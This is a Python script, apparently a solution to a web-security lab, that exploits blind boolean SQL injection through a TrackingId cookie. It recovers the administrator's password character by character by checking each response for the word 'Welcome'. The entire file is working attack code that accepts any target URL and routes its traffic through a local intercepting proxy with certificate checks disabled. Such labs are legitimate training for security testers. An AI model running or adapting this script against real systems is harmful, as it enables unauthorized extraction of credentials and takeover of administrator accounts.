import requests, sys, urllib3, urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url):
    traking_id_cookie = "7vJELm4RE9DYHLeW"
    session_id_cookie = "fS1aoyoJMAU9uPLPQfaVxlpXjgpZcXdt"
    extracted_password = ''
    for i in range(1, 21):
        for j in range(32, 126):
            payload = f"' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username = 'administrator')='{chr(j)}'--"
            encoded_payload = urllib.parse.quote(payload)
            cookies = {"TrackingId": traking_id_cookie + encoded_payload, "session": session_id_cookie}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + extracted_password + chr(j))
                sys.stdout.flush()
            else:
                extracted_password += chr(j)
                sys.stdout.write('\r' + extracted_password)
                sys.stdout.flush()
                break


def main():
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f'[-] Usage: python3 {sys.argv[0]} <url>')
        print(f'[-] Example: python3 {sys.argv[0]} http://example.com')
        sys.exit(1)
    
    print('[*] Reteriving the administrator password...')
    exploit_sqli(url)


if __name__ == '__main__':
    main()